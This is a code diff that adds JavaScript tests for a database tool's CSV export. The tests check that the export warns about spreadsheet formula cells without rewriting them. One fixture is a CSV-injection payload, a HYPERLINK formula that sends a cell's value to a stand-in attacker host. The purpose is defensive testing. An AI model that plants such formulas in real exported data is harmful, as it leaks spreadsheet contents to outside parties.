@@ -442,6 +442,134 @@ describe('DatabaseToolsHandler', () => {
   });
 
   describe('exportTableCsv', () => {
+    // #1245: the export never rewrites a value to defuse it - that would corrupt the data for
+    // every consumer that is not a spreadsheet. It reports instead, in a SECOND content block
+    // so the first stays a clean, parseable CSV.
+    describe('spreadsheet formula warning', () => {
+      const stubStats = totalRows => {
+        handler.streamingHandler.getStreamingStats = vi.fn().mockReturnValue({
+          streaming: false,
+          memoryEfficient: false,
+          totalRows
+        });
+      };
+
+      test('warns in a second block when a non-streamed export holds a formula value', async () => {
+        const mockData = [
+          { id: 1, note: '=HYPERLINK("http://attacker/?"&A1)' },
+          { id: 2, note: 'plain' }
+        ];
+        handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
+          success: true,
+          streaming: false,
+          recordset: mockData,
+          totalRows: 2,
+          performance: { duration: 5, rowCount: 2, memoryEfficient: false }
+        });
+        stubStats(2);
+
+        const result = await handler.exportTableCsv('Notes');
+
+        expect(result).toHaveLength(2);
+        expect(result[1].type).toBe('text');
+        expect(result[1].text).toContain('1 cell');
+        expect(result[1].text).toContain('unmodified by design');
+
+        // The bytes are untouched: the payload is quoted per RFC 4180 and nothing else.
+        expect(result[0].text).toContain('1,"=HYPERLINK(""http://attacker/?""&A1)"');
+        expect(result[0].text).not.toContain("'=HYPERLINK");
+      });
+
+      test('warns for a streamed export by summing the counts the chunks carry', async () => {
+        handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
+          success: true,
+          streaming: true,
+          chunks: [
+            { chunkNumber: 1, data: 'id,note\n1,=1+1\n', rowCount: 1, size: 16, riskyCells: 1 },
+            { chunkNumber: 2, data: '2,@SUM(A1)\n', rowCount: 1, size: 11, riskyCells: 1 }
+          ],
+          totalRows: 2,
+          performance: { duration: 9, rowCount: 2, memoryEfficient: true }
+        });
+        handler.streamingHandler.getStreamingStats = vi.fn().mockReturnValue({
+          streaming: true,
+          memoryEfficient: true,
+          totalRows: 2
+        });
+        // The shared beforeEach stubs this to return undefined.
+        handler.streamingHandler.reconstructFromChunks = vi
+          .fn()
+          .mockReturnValue('id,note\n1,=1+1\n2,@SUM(A1)\n');
+
+        const result = await handler.exportTableCsv('Notes');
+
+        expect(result).toHaveLength(2);
+        expect(result[1].text).toContain('2 cells');
+        expect(result[0].text).toBe('id,note\n1,=1+1\n2,@SUM(A1)\n');
+      });
+
+      // The exemption is the difference between a signal and noise: mssql returns INT and
+      // DECIMAL as JS numbers, so a naive leading-character test flags every negative figure
+      // in a ledger and the warning becomes something its reader learns to skip.
+      test('stays silent on a table of ordinary negative numbers', async () => {
+        handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
+          success: true,
+          streaming: false,
+          recordset: [
+            { account: 'ops', delta: -1 },
+            { account: 'rnd', delta: -1250.75 }
+          ],
+          totalRows: 2,
+          performance: { duration: 4, rowCount: 2, memoryEfficient: false }
+        });
+        stubStats(2);
+
+        const result = await handler.exportTableCsv('Ledger');
+
+        expect(result).toHaveLength(1);
+        expect(result[0].text).toBe('account,delta\nops,-1\nrnd,-1250.75\n');
+      });
+
+      // A column NAME is written through the same csvRow helper and evaluated just like a
+      // data cell, so it has to be in scope - but only once, not once per row.
+      test('counts a formula-shaped column name exactly once', async () => {
+        handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
+          success: true,
+          streaming: false,
+          recordset: [{ '=total': 1 }, { '=total': 2 }],
+          totalRows: 2,
+          performance: { duration: 3, rowCount: 2, memoryEfficient: false }
+        });
+        stubStats(2);
+
+        const result = await handler.exportTableCsv('Totals');
+
+        expect(result).toHaveLength(2);
+        expect(result[1].text).toContain('1 cell');
+      });
+
+      // Chunks predating this change carry no riskyCells field; summing must not produce NaN.
+      test('treats a chunk without a count as zero rather than NaN', async () => {
+        handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
+          success: true,
+          streaming: true,
+          chunks: [{ chunkNumber: 1, data: 'id\n1\n', rowCount: 1, size: 6 }],
+          totalRows: 1,
+          performance: { duration: 2, rowCount: 1, memoryEfficient: true }
+        });
+        handler.streamingHandler.getStreamingStats = vi.fn().mockReturnValue({
+          streaming: true,
+          memoryEfficient: true,
+          totalRows: 1
+        });
+        handler.streamingHandler.reconstructFromChunks = vi.fn().mockReturnValue('id\n1\n');
+
+        const result = await handler.exportTableCsv('Ids');
+
+        expect(result).toHaveLength(1);
+      });
+    });
+
     test('should forward WHERE clause to the streaming exporter (regression: where was silently dropped)', async () => {
       handler.streamingHandler.streamTableExport = vi.fn().mockResolvedValue({
         success: true,
